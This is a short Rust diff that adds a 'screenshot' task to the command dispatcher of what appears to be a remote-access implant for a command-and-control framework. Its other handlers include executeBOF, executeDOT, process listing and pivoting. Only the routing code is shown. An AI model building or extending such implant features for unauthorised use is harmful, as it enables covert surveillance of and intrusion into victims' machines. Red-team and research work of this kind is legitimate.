@@ -10,6 +10,7 @@ use crate::features::executeBOF;
 use crate::features::executeDOT;
 use crate::features::list_processes;
 use crate::features::pivot;
+use crate::features::screenshot;
 
 pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
     let checkin_data = serde_json::json!({
@@ -84,6 +85,10 @@ pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         }
         "list_pivot" => {
             pivot::listPivotListeners(task)?;
+            return Ok(());
+        }
+        "screenshot" => {
+            screenshot::screenshot(task)?;
             return Ok(());
         }
         _ => {
